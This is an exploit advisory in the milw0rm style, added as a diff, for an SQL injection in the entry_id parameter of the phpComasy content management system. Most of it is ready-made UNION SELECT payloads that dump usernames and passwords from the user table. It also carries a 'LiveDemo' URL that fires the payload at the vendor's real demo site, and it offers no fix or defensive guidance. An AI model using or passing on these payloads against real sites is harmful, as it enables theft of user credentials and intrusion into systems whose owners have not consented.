@@ -1,0 +1,35 @@
+###################################################
+phpComasy(entry_id) SQL-injection Vulnerability
+###################################################
+
+
+###################################################
+#[~] Author        :  boom3rang 
+#[~] Greetz        :  H!tm@N, KHG, chs, redc00de
+#[~] Vulnerability :  SQL injection 
+#[~] Google Dork   :  N/W
+--------------------------------------------------
+#[!] Name          :  phpComasy   
+#[!] Site          :  www.phpcomasy.com
+#[!] Download      :  http://www.phpcomasy.com/index.php?id=7&mod_action=project_detail&mod_project_id=9
+###################################################
+
+
+[-] Example: 
+http://localhost/Path/?id=22&entry_id=[SQL-injection]
+
+[-] Exploit:
+-9999+union+all+select+1,concat(username,char(58),password),3,4+from+user--
+or
+-9999+union+all+select+1,concat(username,char(58),password),3,4,5,6,7,8,9,0,11,12,13,14+from+user--&mod_action=detail
+
+LiveDemo:
+http://demo.phpcomasy.com/?id=22&entry_id=-9999+union+all+select+1,concat(username,char(58),password),3,4+from+user--&mod_action=detail
+
+##############################
+#[!] Proud 2 be Albanian
+#[!] Proud 2 be Muslim
+#[!] United States of Albania
+##############################
+
+# milw0rm.com [2009-03-16]
